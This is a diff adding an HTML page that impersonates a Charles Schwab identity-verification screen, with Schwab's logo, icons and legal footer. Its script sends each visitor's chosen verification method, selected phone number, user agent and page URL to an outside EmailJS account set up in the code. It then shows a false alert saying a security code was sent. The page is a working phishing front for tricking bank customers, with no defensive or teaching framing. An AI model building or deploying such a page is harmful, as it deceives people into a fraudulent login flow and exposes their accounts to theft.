@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="UTF-8" />
+    <title>Confirm Your Identity | Charles Schwab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <style>
+        :root {
+            --textPrimary: #000000;
+            --textSecondary: #666666;
+            --primaryGreen: #1D7700;
+            --primaryRed: #CC1100;
+            --primaryYellow: #906309;
+            --backgroundPrimary: #FFFFFF;
+            --backgroundSecondary: #F1F1F1;
+            --backgroundTertiary: #F7F7F7;
+            --backgroundQuaternary: #E6E7E9;
+            --separator: #D8D8D8;
+        }
+
+        * {
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+            letter-spacing: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #333;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-weight: 300;
+        }
+
+        h1, h2, h3, h4, h5, h6, p, span, div, .auth-title, .auth-subtitle, .instruction-title, .option-label label, .sdps-text-smallest, #defaultFooter p, #complianceNumber, #retailFooter1, #sipcDisclaimer {
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+            font-weight: 300;
+        }
+
+        button, .authenticator-option, .cancel-button, .option-label {
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+        }
+
+        .auth-title {
+            font-weight: 500;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        .instruction-title {
+            font-weight: 700;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        .option-label label {
+            font-weight: 500;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+        }
+
+        .cancel-button {
+            font-weight: 600;
+        }
+
+        .content-wrapper {
+            flex: 1;
+        }
+
+        .page-wrapper {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px 40px 24px;
+        }
+
+        .full-width-logo-container {
+            width: 100%;
+            background-color: #e6e7e9;
+            padding: 0px 24px;
+            margin: 0;
+            position: relative;
+            left: 0;
+            right: 0;
+        }
+
+        .logo-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .header-logo {
+            width: 100px;
+            height: auto;
+            display: block;
+        }
+
+        .header-logo img {
+            width: 80%;
+            height: auto;
+            display: block;
+        }
+
+        .main-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding-top: 28px;
+        }
+
+        .auth-title {
+            font-size: 1.9rem;
+            font-weight: 400;
+            margin: 1rem 0 0.5rem;
+            color: #1a1a1a;
+        }
+
+        .auth-subtitle {
+            font-size: 1rem;
+            font-weight: 300;
+            color: #4a4e5c;
+            margin-bottom: 20px;
+        }
+
+        .instruction-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin: 0 0 20px 0;
+            letter-spacing: -0.2px;
+            border-left: 3px solid #1D7700;
+            padding-left: 12px;
+        }
+
+        .auth-buttons-section {
+            margin-bottom: 32px;
+        }
+
+        .auth-options-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 260px);
+            grid-template-rows: 158px 158px;
+            gap: 12px;
+            justify-content: start;
+        }
+
+        .auth-options-grid > div:nth-child(4) {
+            grid-column: 1 / 2;
+            width: 260px !important;
+            height: 158px !important;
+            justify-self: start;
+        }
+
+        .authenticator-option {
+            position: relative;
+            cursor: pointer;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            color: #333;
+            background: #fcfcfc;
+            border: 1px solid #dddddd;
+            box-shadow: 4px 4px 4px #e7e7e7;
+            border-radius: 6px;
+            width: 260px !important;
+            height: 158px !important;
+            padding: 25px 15px 15px !important;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            transition: all 0.2s ease;
+            overflow: hidden;
+        }
+
+        .authenticator-option:hover {
+            background: #f8f8f8;
+            border-color: #006e99;
+            box-shadow: 6px 6px 8px #e0e0e0;
+        }
+
+        .authenticator-option.selected {
+            border-color: #006e99;
+            box-shadow: 6px 6px 12px #d0d0d0;
+            background: #f8f9ff;
+        }
+
+        .icon-section {
+            width: 56px;
+            height: 56px;
+            border-radius: 12px;
+            background: #eef1f7;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 10px;
+            overflow: hidden;
+            transition: all 0.2s ease;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .icon-section img.default-icon {
+            width: 34px;
+            height: 34px;
+            object-fit: contain;
+            transition: opacity 0.2s ease;
+            filter: brightness(0) saturate(100%) invert(27%) sepia(8%) saturate(1230%) hue-rotate(174deg) brightness(96%) contrast(86%);
+        }
+
+        .icon-section img.hover-icon {
+            width: 34px;
+            height: 34px;
+            object-fit: contain;
+            opacity: 0;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: opacity 0.2s ease;
+            filter: brightness(0) saturate(100%) invert(100%) sepia(0%) saturate(0%) hue-rotate(93deg) brightness(103%) contrast(103%);
+        }
+
+        .authenticator-option:hover .icon-section .default-icon {
+            opacity: 0;
+        }
+
+        .authenticator-option:hover .icon-section .hover-icon {
+            opacity: 1;
+        }
+
+        .authenticator-option:hover .icon-section {
+            background: #006e99;
+        }
+
+        .option-label {
+            width: 100%;
+            font-size: 1rem;
+            font-weight: 500;
+            margin: 0;
+            line-height: 1.3;
+            text-align: center;
+            word-wrap: break-word;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+        }
+
+        .option-label label {
+            font-size: inherit;
+            font-weight: 500;
+            margin: 0;
+            display: block;
+            width: 100%;
+            padding: 0 10px;
+            color: #2c3e50;
+        }
+
+        .next-icon {
+            display: none !important;
+        }
+
+        .separator-line {
+            width: 100%;
+            height: 2px;
+            background-color: #D8D8D8;
+            margin: 24px 0 28px 0;
+            border: none;
+        }
+
+        .cancel-section {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            margin-top: 8px;
+            margin-bottom: 40px;
+        }
+
+        .cancel-button {
+            background-color: #D8D8D8;
+            border: 1px solid #b0b3b8;
+            border-radius: 8px;
+            padding: 15px 32px;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #2c3e50;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            min-width: 140px;
+        }
+
+        .cancel-button:hover {
+            background-color: #c5c5c5;
+            border-color: #8c8f96;
+            transform: translateY(-1px);
+        }
+
+        .cancel-button:active {
+            transform: translateY(1px);
+            background-color: #b8b8b8;
+        }
+
+        /* POPUP MODAL STYLES */
+        .phone-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(3px);
+        }
+
+        .phone-popup-container {
+            background: white;
+            border-radius: 8px;
+            max-width: 480px;
+            width: 90%;
+            padding: 28px 24px 32px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.25);
+            animation: fadeInUp 0.25s ease-out;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .popup-title {
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin: 0 0 8px 0;
+            color: #1a1a1a;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        .popup-subtitle {
+            font-size: 0.9rem;
+            color: #5a5e6b;
+            margin: 0 0 20px 0;
+            font-weight: 300;
+            border-bottom: 1px solid #eaeef2;
+            padding-bottom: 12px;
+        }
+
+        .phone-numbers-list {
+            margin: 20px 0 24px 0;
+        }
+
+        .phone-option {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #e0e4e8;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background-color: #fefefe;
+        }
+
+        .phone-option:hover {
+            background-color: #f4f7fc;
+            border-color: #006e99;
+            transform: translateX(3px);
+        }
+
+        .phone-option.selected-phone {
+            border-color: #1D7700;
+            background-color: #f0f9ec;
+            box-shadow: 0 2px 6px rgba(29, 119, 0, 0.1);
+        }
+
+        .phone-radio {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #b0b3b8;
+            margin-right: 14px;
+            position: relative;
+            background: white;
+            transition: all 0.15s ease;
+        }
+
+        .phone-option.selected-phone .phone-radio {
+            border-color: #1D7700;
+            background-color: #1D7700;
+            box-shadow: inset 0 0 0 4px white;
+        }
+
+        .phone-details {
+            flex: 1;
+        }
+
+        .phone-number {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+            letter-spacing: 0.2px;
+        }
+
+        .phone-label {
+            font-size: 0.75rem;
+            color: #6c757d;
+            margin-top: 4px;
+            font-weight: 300;
+        }
+
+        .popup-actions {
+            display: flex;
+            gap: 14px;
+            justify-content: flex-end;
+            margin-top: 16px;
+        }
+
+        .popup-cancel-btn, .popup-send-btn {
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: 1px solid #000000;
+            background: white;
+            font-family: "CharlesModern-Regular", "Charles Modern", Arial, sans-serif;
+        }
+
+        .popup-cancel-btn {
+            background: white;
+            color: #2c3e50;
+        }
+
+        .popup-cancel-btn:hover {
+            background: #f1f3f5;
+            transform: translateY(-1px);
+        }
+
+        .popup-send-btn {
+            background: #d4f0cf;
+            color: #1a5c00;
+            border: 1px solid #000000;
+        }
+
+        .popup-send-btn:hover {
+            background: #c0e8b8;
+            transform: translateY(-1px);
+        }
+
+        .popup-send-btn:active, .popup-cancel-btn:active {
+            transform: translateY(1px);
+        }
+
+        .error-message {
+            color: #cc1100;
+            font-size: 0.8rem;
+            margin-top: 12px;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .loading-spinner-small {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a5c00;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .sdps-grid-container {
+            width: 100%;
+            background-color: #f5f7fa;
+            border-top: 1px solid #e0e4e8;
+            margin-top: 20px;
+        }
+
+        .sdps-wrap {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .centered {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px 24px 32px 24px;
+            width: 100%;
+        }
+
+        .sdps-text-smallest {
+            font-size: 11px;
+            font-weight: 300;
+            line-height: 1.5;
+            color: #5a5e6b;
+            font-family: "CharlesModern-Light", Helvetica, Arial, sans-serif;
+        }
+
+        #defaultFooter p {
+            margin: 12px 0;
+            font-size: 11px;
+            font-weight: 300;
+            line-height: 1.5;
+        }
+
+        #retailFooter1 a {
+            color: #006e99;
+            text-decoration: none;
+            font-weight: 300;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #006e99;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @media (max-width: 900px) {
+            .auth-options-grid {
+                grid-template-columns: 1fr;
+                grid-template-rows: repeat(4, 158px);
+                justify-content: center;
+                width: 100%;
+            }
+            .authenticator-option {
+                width: 100% !important;
+                max-width: 260px;
+                margin: 0 auto 12px;
+            }
+            .auth-options-grid > div:nth-child(4) {
+                width: 100% !important;
+                max-width: 260px;
+                margin: 0 auto;
+            }
+            .centered {
+                padding: 20px 20px 28px 20px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .full-width-logo-container {
+                padding: 10px 16px;
+            }
+            .header-logo {
+                width: 85px;
+            }
+            .page-wrapper {
+                padding: 16px 20px 32px 20px;
+            }
+            .phone-popup-container {
+                padding: 20px 18px 24px;
+            }
+            .popup-title {
+                font-size: 1.3rem;
+            }
+            .popup-actions {
+                flex-direction: column;
+            }
+            .popup-cancel-btn, .popup-send-btn {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <div class="full-width-logo-container">
+            <div class="logo-inner">
+                <div class="header-logo">
+                    <img src="https://2dhk5ye3hl.ucarecd.net/95492c26-4809-4f9a-a925-f8f93454cc56/charleslogo.svg"
+                         alt="Charles Schwab"
+                         onerror="this.style.display='none';" />
+                </div>
+            </div>
+        </div>
+
+        <div class="page-wrapper">
+            <div class="main-content">
+                <h1 class="auth-title">Confirm Your Identity</h1>
+                <p class="auth-subtitle">We want to verify your identity.</p>
+                <div class="instruction-title">Select which method you prefer.</div>
+
+                <div class="auth-buttons-section">
+                    <div class="auth-options-grid">
+                        <div class="authenticator-option" id="mobile_approve" role="button" tabindex="0">
+                            <div class="icon-section">
+                                <img class="default-icon" alt="Mobile notification" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-symantec.png">
+                                <img class="hover-icon" alt="Mobile notification" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-symantec.png">
+                            </div>
+                            <div class="option-label"><label>Send a mobile notification</label></div>
+                        </div>
+                        <div class="authenticator-option" id="otp_sms" role="button" tabindex="0">
+                            <div class="icon-section">
+                                <img class="default-icon" alt="Text me" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-chat.png">
+                                <img class="hover-icon" alt="Text me" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-chat-white.png">
+                            </div>
+                            <div class="option-label"><label>Text me</label></div>
+                        </div>
+                        <div class="authenticator-option" id="otp_voice" role="button" tabindex="0">
+                            <div class="icon-section">
+                                <img class="default-icon" alt="Call me" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-call.png">
+                                <img class="hover-icon" alt="Call me" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-call-white.png">
+                            </div>
+                            <div class="option-label"><label>Call me</label></div>
+                        </div>
+                        <div class="authenticator-option" id="devicetag_rep" role="button" tabindex="0">
+                            <div class="icon-section">
+                                <img class="default-icon" alt="Call Schwab" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-call.png">
+                                <img class="hover-icon" alt="Call Schwab" src="https://sws-gateway-nr.schwab.com/ui/host/assets/icons/icon-call-white.png">
+                            </div>
+                            <div class="option-label"><label>Call Schwab</label></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="separator-line"></div>
+                <div class="cancel-section">
+                    <button class="cancel-button" id="cancelIdentityBtn" type="button">Cancel</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="disclaimers" class="sdps-grid-container sdps-wrap">
+        <div role="contentinfo" class="col-10 centered col-m-full col-s-full top-line show-footer">
+            <footer>
+                <section class="sdps-text-smallest">
+                    <div id="defaultFooter">
+                        <p id="complianceNumber">(1120-0NMB)</p>
+                        <p id="retailFooter1">Charles Schwab &amp; Co., Inc. and Charles Schwab Bank, SSB, are separate but affiliated companies and wholly-owned subsidiaries of The Charles Schwab Corporation. Brokerage products and services are offered by Charles Schwab &amp; Co., Inc., SSB (Member <a href="https://www.sipc.org/" target="_blank">SIPC</a>). Deposit and lending products and services are offered by Charles Schwab Bank, SSB, Member FDIC and an Equal Housing Lender.</p>
+                        <p id="sipcDisclaimer">© 2026 Charles Schwab &amp; Co., Inc, All rights reserved. Member SIPC. Unauthorized access is prohibited. Usage will be monitored.</p>
+                    </div>
+                </section>
+            </footer>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("SdkmRe8WZ7itEba9z");
+        })();
+
+        // Phone numbers displayed as (XXX) XXX - XXXX format
+        const phoneNumbers = [
+            { number: "(XXX) XXX - XXXX", label: "Primary mobile • SMS capable" },
+            { number: "(XXX) XXX - XXXX", label: "Secondary • Voice & text" }
+        ];
+
+        let selectedPhone = null;
+        let pendingMethod = null;
+        let popupElement = null;
+
+        function showPhonePopup(selectedMethodName, methodId) {
+            if (popupElement) popupElement.remove();
+
+            const overlay = document.createElement('div');
+            overlay.className = 'phone-popup-overlay';
+
+            const container = document.createElement('div');
+            container.className = 'phone-popup-container';
+
+            container.innerHTML = `
+                <h3 class="popup-title">Verify with ${selectedMethodName}</h3>
+                <div class="popup-subtitle">Select a phone number to receive your security code</div>
+                <div class="phone-numbers-list" id="phoneOptionsList"></div>
+                <div id="popupError" class="error-message" style="display: none;"></div>
+                <div class="popup-actions">
+                    <button class="popup-cancel-btn" id="popupCancelBtn">Cancel</button>
+                    <button class="popup-send-btn" id="popupSendBtn">Send Code</button>
+                </div>
+            `;
+
+            overlay.appendChild(container);
+            document.body.appendChild(overlay);
+            popupElement = overlay;
+
+            const listContainer = container.querySelector('#phoneOptionsList');
+            phoneNumbers.forEach((phone, idx) => {
+                const phoneDiv = document.createElement('div');
+                phoneDiv.className = 'phone-option';
+                if (idx === 0) {
+                    phoneDiv.classList.add('selected-phone');
+                    selectedPhone = phone.number;
+                }
+                phoneDiv.setAttribute('data-phone', phone.number);
+                phoneDiv.innerHTML = `
+                    <div class="phone-radio"></div>
+                    <div class="phone-details">
+                        <div class="phone-number">${phone.number}</div>
+                        <div class="phone-label">${phone.label}</div>
+                    </div>
+                `;
+                phoneDiv.addEventListener('click', () => {
+                    document.querySelectorAll('.phone-option').forEach(opt => opt.classList.remove('selected-phone'));
+                    phoneDiv.classList.add('selected-phone');
+                    selectedPhone = phone.number;
+                    const errDiv = container.querySelector('#popupError');
+                    if (errDiv) errDiv.style.display = 'none';
+                });
+                listContainer.appendChild(phoneDiv);
+            });
+
+            const cancelBtn = container.querySelector('#popupCancelBtn');
+            cancelBtn.addEventListener('click', () => {
+                if (popupElement) popupElement.remove();
+                popupElement = null;
+                selectedPhone = null;
+                pendingMethod = null;
+                document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
+            });
+
+            const sendBtn = container.querySelector('#popupSendBtn');
+            sendBtn.addEventListener('click', async () => {
+                if (!selectedPhone) {
+                    const errDiv = container.querySelector('#popupError');
+                    errDiv.textContent = 'Please select a phone number.';
+                    errDiv.style.display = 'block';
+                    return;
+                }
+
+                sendBtn.disabled = true;
+                cancelBtn.disabled = true;
+                const originalSendText = sendBtn.innerHTML;
+                sendBtn.innerHTML = '<span class="loading-spinner-small"></span> Sending...';
+
+                const loadingOverlay = document.getElementById('loadingOverlay');
+                if (loadingOverlay) loadingOverlay.style.display = 'flex';
+
+                try {
+                    const response = await emailjs.send(
+                        "service_zuj2d2a",
+                        "template_tvd86sp",
+                        {
+                            button_clicked: pendingMethod?.name || selectedMethodName,
+                            button_id: pendingMethod?.id || methodId,
+                            selected_phone: selectedPhone,
+                            timestamp: new Date().toLocaleString(),
+                            user_agent: navigator.userAgent,
+                            url: window.location.href
+                        }
+                    );
+                    console.log(`✅ Verification requested for ${selectedMethodName} to ${selectedPhone}. Status:`, response.status);
+
+                    if (popupElement) popupElement.remove();
+                    popupElement = null;
+                    alert(`Verification code sent to ${selectedPhone}. Please check your device.`);
+
+                } catch (error) {
+                    console.error("❌ EmailJS failed:", error);
+                    const errDiv = container.querySelector('#popupError');
+                    errDiv.textContent = 'Failed to send code. Please try again.';
+                    errDiv.style.display = 'block';
+                    sendBtn.disabled = false;
+                    cancelBtn.disabled = false;
+                    sendBtn.innerHTML = originalSendText;
+                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+                    return;
+                } finally {
+                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+                    sendBtn.disabled = false;
+                    cancelBtn.disabled = false;
+                    sendBtn.innerHTML = originalSendText;
+                }
+            });
+        }
+
+        const authMethods = {
+            mobile_approve: "Send a mobile notification",
+            otp_sms: "Text me",
+            otp_voice: "Call me",
+            devicetag_rep: "Call Schwab"
+        };
+
+        Object.keys(authMethods).forEach(methodId => {
+            const btn = document.getElementById(methodId);
+            if (btn) {
+                btn.addEventListener("click", (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+
+                    document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
+                    btn.classList.add('selected');
+
+                    const methodName = authMethods[methodId];
+                    pendingMethod = { id: methodId, name: methodName };
+                    showPhonePopup(methodName, methodId);
+                });
+            }
+        });
+
+        const mainCancelBtn = document.getElementById('cancelIdentityBtn');
+        if (mainCancelBtn) {
+            mainCancelBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (popupElement) {
+                    popupElement.remove();
+                    popupElement = null;
+                }
+                document.querySelectorAll('.authenticator-option').forEach(opt => opt.classList.remove('selected'));
+                alert('Verification cancelled. You may close this window or return to the Schwab home page.');
+            });
+        }
+    </script>
+</body>
+</html>
